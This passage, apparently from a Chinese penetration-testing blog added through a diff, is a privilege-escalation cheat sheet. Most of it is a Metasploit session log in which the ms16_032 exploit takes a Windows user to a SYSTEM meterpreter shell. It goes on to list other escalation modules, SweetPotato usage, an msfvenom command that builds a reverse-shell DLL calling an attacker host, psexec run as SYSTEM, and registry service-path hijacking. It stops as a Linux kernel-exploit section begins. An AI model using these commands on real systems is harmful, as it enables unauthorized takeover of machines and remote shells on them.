+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">meterpreter</span> <span class="o">&gt;</span> <span class="n">getuid</span>    <span class="o">//</span><span class="err">查看权限</span>
+</span></span><span class="line"><span class="cl"><span class="n">Server</span> <span class="n">username</span><span class="p">:</span> <span class="n">HACK</span>\<span class="n">testuser</span>
+</span></span><span class="line"><span class="cl"><span class="n">meterpreter</span> <span class="o">&gt;</span> <span class="n">background</span> <span class="o">//</span><span class="err">当前激活的</span><span class="n">shell切换到后台</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Backgrounding</span> <span class="n">session</span> <span class="mf">1.</span><span class="o">..</span>
+</span></span><span class="line"><span class="cl"><span class="n">msf5</span> <span class="n">exploit</span><span class="p">(</span><span class="n">multi</span><span class="o">/</span><span class="n">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">search</span> <span class="n">suggester</span>   <span class="o">//</span><span class="err">查找辅助提权模块</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="n">Matching</span> <span class="n">Modules</span>
+</span></span><span class="line"><span class="cl"><span class="o">================</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#  Name                                      Disclosure Date  Rank    Check  Description</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span>  <span class="o">----</span>                                      <span class="o">---------------</span>  <span class="o">----</span>    <span class="o">-----</span>  <span class="o">-----------</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0</span>  <span class="n">post</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">recon</span><span class="o">/</span><span class="n">local_exploit_suggester</span>                   <span class="n">normal</span>  <span class="n">No</span>     <span class="n">Multi</span> <span class="n">Recon</span> <span class="n">Local</span> <span class="n">Exploit</span> <span class="n">Suggester</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="n">msf5</span> <span class="n">exploit</span><span class="p">(</span><span class="n">multi</span><span class="o">/</span><span class="n">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">use</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">msf5</span> <span class="n">post</span><span class="p">(</span><span class="n">multi</span><span class="o">/</span><span class="n">recon</span><span class="o">/</span><span class="n">local_exploit_suggester</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">sessions</span> <span class="o">//</span><span class="err">查看会话</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="n">Active</span> <span class="n">sessions</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="n">Id</span>  <span class="n">Name</span>  <span class="n">Type</span>                     <span class="n">Information</span>                      <span class="n">Connection</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="o">--</span>  <span class="o">----</span>  <span class="o">----</span>                     <span class="o">-----------</span>                      <span class="o">----------</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="mi">1</span>         <span class="n">meterpreter</span> <span class="n">x86</span><span class="o">/</span><span class="n">windows</span>  <span class="n">HACK</span>\<span class="n">testuser</span> <span class="err">@</span> <span class="n">WIN</span><span class="o">-</span><span class="mi">1</span><span class="n">EVLV0JUJD6</span>  <span class="mf">192.168</span><span class="o">.</span><span class="mf">43.6</span><span class="p">:</span><span class="mi">8866</span> <span class="o">-&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">43.87</span><span class="p">:</span><span class="mi">49394</span> <span class="p">(</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">43.87</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="n">msf5</span> <span class="n">post</span><span class="p">(</span><span class="n">multi</span><span class="o">/</span><span class="n">recon</span><span class="o">/</span><span class="n">local_exploit_suggester</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">set</span> <span class="n">session</span> <span class="mi">1</span> <span class="o">//</span><span class="err">设置会话</span>
+</span></span><span class="line"><span class="cl"><span class="n">session</span> <span class="o">=&gt;</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">msf5</span> <span class="n">post</span><span class="p">(</span><span class="n">multi</span><span class="o">/</span><span class="n">recon</span><span class="o">/</span><span class="n">local_exploit_suggester</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">exploit</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">43.87</span> <span class="o">-</span> <span class="n">Collecting</span> <span class="n">local</span> <span class="n">exploits</span> <span class="k">for</span> <span class="n">x86</span><span class="o">/</span><span class="n">windows</span><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">43.87</span> <span class="o">-</span> <span class="mi">30</span> <span class="n">exploit</span> <span class="n">checks</span> <span class="n">are</span> <span class="n">being</span> <span class="n">tried</span><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">43.87</span> <span class="o">-</span> <span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bypassuac_eventvwr</span><span class="p">:</span> <span class="n">The</span> <span class="n">target</span> <span class="n">appears</span> <span class="n">to</span> <span class="n">be</span> <span class="n">vulnerable</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">43.87</span> <span class="o">-</span> <span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">ms10_092_schelevator</span><span class="p">:</span> <span class="n">The</span> <span class="n">target</span> <span class="n">appears</span> <span class="n">to</span> <span class="n">be</span> <span class="n">vulnerable</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">43.87</span> <span class="o">-</span> <span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">ms13_053_schlamperei</span><span class="p">:</span> <span class="n">The</span> <span class="n">target</span> <span class="n">appears</span> <span class="n">to</span> <span class="n">be</span> <span class="n">vulnerable</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">43.87</span> <span class="o">-</span> <span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">ms13_081_track_popup_menu</span><span class="p">:</span> <span class="n">The</span> <span class="n">target</span> <span class="n">appears</span> <span class="n">to</span> <span class="n">be</span> <span class="n">vulnerable</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">43.87</span> <span class="o">-</span> <span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">ms14_058_track_popup_menu</span><span class="p">:</span> <span class="n">The</span> <span class="n">target</span> <span class="n">appears</span> <span class="n">to</span> <span class="n">be</span> <span class="n">vulnerable</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">43.87</span> <span class="o">-</span> <span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">ms15_051_client_copy_image</span><span class="p">:</span> <span class="n">The</span> <span class="n">target</span> <span class="n">appears</span> <span class="n">to</span> <span class="n">be</span> <span class="n">vulnerable</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">43.87</span> <span class="o">-</span> <span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">ms16_032_secondary_logon_handle_privesc</span><span class="p">:</span> <span class="n">The</span> <span class="n">service</span> <span class="n">is</span> <span class="n">running</span><span class="p">,</span> <span class="n">but</span> <span class="n">could</span> <span class="ow">not</span> <span class="n">be</span> <span class="n">validated</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">43.87</span> <span class="o">-</span> <span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">ppr_flatten_rec</span><span class="p">:</span> <span class="n">The</span> <span class="n">target</span> <span class="n">appears</span> <span class="n">to</span> <span class="n">be</span> <span class="n">vulnerable</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Post</span> <span class="n">module</span> <span class="n">execution</span> <span class="n">completed</span>
+</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="err">以上为查找出来的可利用的漏洞</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="n">msf5</span> <span class="n">post</span><span class="p">(</span><span class="n">multi</span><span class="o">/</span><span class="n">recon</span><span class="o">/</span><span class="n">local_exploit_suggester</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">ms16_032_secondary_logon_handle_privesc</span>   <span class="o">//</span><span class="err">选择上面的任意一个漏洞模块进入</span>
+</span></span><span class="line"><span class="cl"><span class="n">msf5</span> <span class="n">exploit</span><span class="p">(</span><span class="n">windows</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">ms16_032_secondary_logon_handle_privesc</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">show</span> <span class="n">options</span>  <span class="o">//</span><span class="err">查看需要设置的参数</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="n">Module</span> <span class="n">options</span> <span class="p">(</span><span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">ms16_032_secondary_logon_handle_privesc</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="n">Name</span>     <span class="n">Current</span> <span class="n">Setting</span>  <span class="n">Required</span>  <span class="n">Description</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="o">----</span>     <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="n">SESSION</span>                   <span class="n">yes</span>       <span class="n">The</span> <span class="n">session</span> <span class="n">to</span> <span class="n">run</span> <span class="n">this</span> <span class="n">module</span> <span class="n">on</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="n">Exploit</span> <span class="n">target</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="n">Id</span>  <span class="n">Name</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="o">--</span>  <span class="o">----</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="mi">0</span>   <span class="n">Windows</span> <span class="n">x86</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="n">msf5</span> <span class="n">exploit</span><span class="p">(</span><span class="n">windows</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">ms16_032_secondary_logon_handle_privesc</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">set</span> <span class="n">session</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">session</span> <span class="o">=&gt;</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">msf5</span> <span class="n">exploit</span><span class="p">(</span><span class="n">windows</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">ms16_032_secondary_logon_handle_privesc</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">exploit</span> 
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Started</span> <span class="n">reverse</span> <span class="n">TCP</span> <span class="n">handler</span> <span class="n">on</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">43.6</span><span class="p">:</span><span class="mi">4444</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Compressed</span> <span class="n">size</span><span class="p">:</span> <span class="mi">1016</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="n">Executing</span> <span class="mi">32</span><span class="o">-</span><span class="n">bit</span> <span class="n">payload</span> <span class="n">on</span> <span class="mi">64</span><span class="o">-</span><span class="n">bit</span> <span class="n">ARCH</span><span class="p">,</span> <span class="n">using</span> <span class="n">SYSWOW64</span> <span class="n">powershell</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Writing</span> <span class="n">payload</span> <span class="n">file</span><span class="p">,</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">testuser</span>\<span class="n">AppData</span>\<span class="n">Local</span>\<span class="n">Temp</span>\<span class="n">GLDpeYcGYT</span><span class="o">.</span><span class="n">ps1</span><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Compressing</span> <span class="n">script</span> <span class="n">contents</span><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Compressed</span> <span class="n">size</span><span class="p">:</span> <span class="mi">3596</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Executing</span> <span class="n">exploit</span> <span class="n">script</span><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="n">__</span> <span class="n">__</span> <span class="n">___</span> <span class="n">___</span>   <span class="n">___</span>     <span class="n">___</span> <span class="n">___</span> <span class="n">___</span> <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Sending</span> <span class="n">stage</span> <span class="p">(</span><span class="mi">180291</span> <span class="n">bytes</span><span class="p">)</span> <span class="n">to</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">43.87</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>  <span class="n">V</span>  <span class="o">|</span>  <span class="n">_</span><span class="o">|</span><span class="n">_</span>  <span class="o">|</span> <span class="o">|</span>  <span class="n">_</span><span class="o">|</span><span class="n">___</span><span class="o">|</span>   <span class="o">|</span><span class="n">_</span>  <span class="o">|</span><span class="n">_</span>  <span class="o">|</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>     <span class="o">|</span><span class="n">_</span>  <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">.</span> <span class="o">|</span><span class="n">___</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span><span class="n">_</span>  <span class="o">|</span>  <span class="n">_</span><span class="o">|</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">___</span><span class="o">|</span><span class="n">_____</span><span class="o">|</span><span class="n">___</span><span class="o">|</span>   <span class="o">|</span><span class="n">___</span><span class="o">|</span><span class="n">___</span><span class="o">|</span><span class="n">___</span><span class="o">|</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="n">by</span> <span class="n">b33f</span> <span class="o">-&gt;</span> <span class="err">@</span><span class="n">FuzzySec</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="err">?</span><span class="p">]</span> <span class="n">Operating</span> <span class="n">system</span> <span class="n">core</span> <span class="n">count</span><span class="p">:</span> <span class="mi">4</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">&gt;</span><span class="p">]</span> <span class="n">Duplicating</span> <span class="n">CreateProcessWithLogonW</span> <span class="n">handle</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="err">?</span><span class="p">]</span> <span class="n">Done</span><span class="p">,</span> <span class="n">using</span> <span class="n">thread</span> <span class="n">handle</span><span class="p">:</span> <span class="mi">1212</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Sniffing</span> <span class="n">out</span> <span class="n">privileged</span> <span class="n">impersonation</span> <span class="n">token</span><span class="o">..</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="err">?</span><span class="p">]</span> <span class="ne">Thread</span> <span class="n">belongs</span> <span class="n">to</span><span class="p">:</span> <span class="n">svchost</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="ne">Thread</span> <span class="n">suspended</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">&gt;</span><span class="p">]</span> <span class="n">Wiping</span> <span class="n">current</span> <span class="n">impersonation</span> <span class="n">token</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">&gt;</span><span class="p">]</span> <span class="n">Building</span> <span class="n">SYSTEM</span> <span class="n">impersonation</span> <span class="n">token</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="err">?</span><span class="p">]</span> <span class="n">Success</span><span class="p">,</span> <span class="n">open</span> <span class="n">SYSTEM</span> <span class="n">token</span> <span class="n">handle</span><span class="p">:</span> <span class="mi">1208</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Resuming</span> <span class="n">thread</span><span class="o">..</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Sniffing</span> <span class="n">out</span> <span class="n">SYSTEM</span> <span class="n">shell</span><span class="o">..</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">&gt;</span><span class="p">]</span> <span class="n">Duplicating</span> <span class="n">SYSTEM</span> <span class="n">token</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">&gt;</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">token</span> <span class="n">race</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">&gt;</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">process</span> <span class="n">race</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="n">Holy</span> <span class="n">handle</span> <span class="n">leak</span> <span class="n">Batman</span><span class="p">,</span> <span class="n">we</span> <span class="n">have</span> <span class="n">a</span> <span class="n">SYSTEM</span> <span class="n">shell</span><span class="o">!!</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="n">mzCdEBgemRgjV7PHoMA8c4KLG2nLKesP</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Executed</span> <span class="n">on</span> <span class="n">target</span> <span class="n">machine</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Meterpreter</span> <span class="n">session</span> <span class="mi">2</span> <span class="n">opened</span> <span class="p">(</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">43.6</span><span class="p">:</span><span class="mi">4444</span> <span class="o">-&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">43.87</span><span class="p">:</span><span class="mi">49513</span><span class="p">)</span> <span class="n">at</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">06</span><span class="o">-</span><span class="mi">01</span> <span class="mi">09</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">28</span> <span class="o">+</span><span class="mi">0800</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Deleted</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">testuser</span>\<span class="n">AppData</span>\<span class="n">Local</span>\<span class="n">Temp</span>\<span class="n">GLDpeYcGYT</span><span class="o">.</span><span class="n">ps1</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="n">meterpreter</span> <span class="o">&gt;</span> <span class="n">getuid</span>  <span class="o">//</span><span class="err">再次查看权限已为</span><span class="n">system</span>
+</span></span><span class="line"><span class="cl"><span class="n">Server</span> <span class="n">username</span><span class="p">:</span> <span class="n">NT</span> <span class="n">AUTHORITY</span>\<span class="n">SYSTEM</span>
+</span></span><span class="line"><span class="cl"><span class="n">meterpreter</span> <span class="o">&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="err">其他提权模块：</span>
+</span></span><span class="line"><span class="cl"><span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">unquoted_service_path</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">session</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Exploit</span> <span class="o">-</span><span class="n">j</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">service_permissions</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">sessions</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">run</span>
+</span></span><span class="line"><span class="cl"><span class="err">​</span>
+</span></span><span class="line"><span class="cl"><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">always_install_elevated</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">sessions</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">run</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h5 id="23-烂土豆提权提权" class="headerLink">
+    <a href="#23-%e7%83%82%e5%9c%9f%e8%b1%86%e6%8f%90%e6%9d%83%e6%8f%90%e6%9d%83" class="header-mark"></a>1.1.2.3 2.3 烂土豆提权提权</h5><p>**适用版本：**Windows 7、8、10、2008、2012</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SweetPotato.exe -a whoami
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h5 id="24-dll劫持提权" class="headerLink">
+    <a href="#24-dll%e5%8a%ab%e6%8c%81%e6%8f%90%e6%9d%83" class="header-mark"></a>1.1.2.4 2.4 DLL劫持提权</h5><p>使用msf生成一个DLL，替换掉应用的dll，等待应用重启（需要提前在本地测试）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.115.34 LPORT=35650 -f dll
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h5 id="25-令牌窃取提权" class="headerLink">
+    <a href="#25-%e4%bb%a4%e7%89%8c%e7%aa%83%e5%8f%96%e6%8f%90%e6%9d%83" class="header-mark"></a>1.1.2.5 2.5 令牌窃取提权</h5><p>拿到session用meterpreter模块</p>
+<h4 id="3psexec提权" class="headerLink">
+    <a href="#3psexec%e6%8f%90%e6%9d%83" class="header-mark"></a>1.1.3 3.psexec提权</h4><p>win2003&amp;win2008</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">psexec.exe -accepteula -s -i -d cmd.exe
+</span></span><span class="line"><span class="cl">开启的cmd窗口也是system权限
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="4注册表提权" class="headerLink">
+    <a href="#4%e6%b3%a8%e5%86%8c%e8%a1%a8%e6%8f%90%e6%9d%83" class="header-mark"></a>1.1.4 4.注册表提权</h4><p>用accesschk.exe检测regsvc注册表可以知道当前用户权限发现是可修改的</p>
+<p>通过修改注册表路径指向我们的反弹文件然后获得一个更高权限</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">修改格式为:reg add KeyName /v EntryName /t DataType /d value /f
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Keyname=具体的注册表路径比如这里的HKLM\SYSTEM\CurrentControlSet\Services\regsvc
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/v =指定要添加到指定子项下的名称
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/t=数据类型这里的REG_EXPAND_SZ意思是长度可变的数据字符串。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/d=指定新注册表项的值
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/f=不用询问信息而直接添加子项
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="linux提权" class="headerLink">
+    <a href="#linux%e6%8f%90%e6%9d%83" class="header-mark"></a>1.2 Linux提权</h3><h4 id="1-内核溢出提权" class="headerLink">
+    <a href="#1-%e5%86%85%e6%a0%b8%e6%ba%a2%e5%87%ba%e6%8f%90%e6%9d%83" class="header-mark"></a>1.2.1 1 内核溢出提权</h4><ul>
+<li>
+<p>uname -a 查看系统版本和内核信息</p>
+</li>
+<li>
